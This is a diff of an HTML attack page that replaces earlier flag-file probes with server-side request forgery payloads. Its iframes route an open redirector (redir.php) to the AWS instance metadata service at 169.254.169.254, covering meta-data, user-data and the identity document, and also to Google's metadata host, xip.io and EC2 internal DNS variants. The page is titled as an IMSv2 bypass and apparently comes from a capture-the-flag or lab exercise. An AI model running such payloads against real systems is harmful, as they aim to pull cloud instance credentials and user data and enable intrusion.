@@ -1,29 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Quick High-Value Targets</title>
+    <title>AWS IMSv2 Bypass</title>
 </head>
 <body>
-    <h1>High-Value Targets</h1>
+    <h1>AWS IMSv2 Bypass Attempts</h1>
     
-    <!-- Most likely flag locations -->
-    <h3>Flag Files via HTTP</h3>
-    <iframe src="http://localhost/redir.php?url=http://localhost/flag.txt" width="100%" height="150"></iframe>
-    <iframe src="http://localhost/redir.php?url=http://127.0.0.1/flag.txt" width="100%" height="150"></iframe>
+    <!-- Try IMSv1 (older API version) -->
+    <h3>IMSv1 Metadata Service</h3>
+    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/1.0/meta-data/" width="100%" height="200"></iframe>
+    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/" width="100%" height="200"></iframe>
     
-    <!-- Try accessing redirector with different methods -->
-    <h3>Direct Redirector Access</h3>
-    <iframe src="http://localhost/redir.php?url=http://localhost:8080/flag.txt" width="100%" height="150"></iframe>
-    <iframe src="http://localhost/redir.php?url=http://127.0.0.1:9000/" width="100%" height="200"></iframe>
+    <!-- Try different user-data endpoints -->
+    <h3>User Data Endpoints</h3>
+    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/latest/user-data/" width="100%" height="200"></iframe>
+    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/1.0/user-data/" width="100%" height="200"></iframe>
     
-    <!-- Try the application's own endpoints -->
-    <h3>Application Endpoints</h3>
-    <iframe src="http://localhost/redir.php?url=http://localhost/secret" width="100%" height="150"></iframe>
-    <iframe src="http://localhost/redir.php?url=http://localhost/admin" width="100%" height="200"></iframe>
+    <!-- Try with different headers (some redirectors pass through headers) -->
+    <h3>Alternative Endpoints</h3>
+    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/latest/dynamic/instance-identity/document" width="100%" height="300"></iframe>
     
-    <!-- Try localhost variations -->
-    <h3>Localhost Variations</h3>
-    <iframe src="http://localhost/redir.php?url=http://0.0.0.0:80/" width="100%" height="200"></iframe>
-    <iframe src="http://localhost/redir.php?url=http://127.1:80/" width="100%" height="200"></iframe>
+    <!-- Try alternative metadata service IPs -->
+    <h3>Alternative Metadata IPs</h3>
+    <iframe src="http://localhost/redir.php?url=http://169.254.169.254.xip.io/latest/meta-data/" width="100%" height="200"></iframe>
+    <iframe src="http://localhost/redir.php?url=http://metadata.google.internal/computeMetadata/v1/instance/" width="100%" height="200"></iframe>
+    
+    <!-- Try DNS-based metadata access -->
+    <h3>DNS-Based Access</h3>
+    <iframe src="http://localhost/redir.php?url=http://instance-data.ec2.internal/latest/meta-data/" width="100%" height="200"></iframe>
 </body>
 </html>
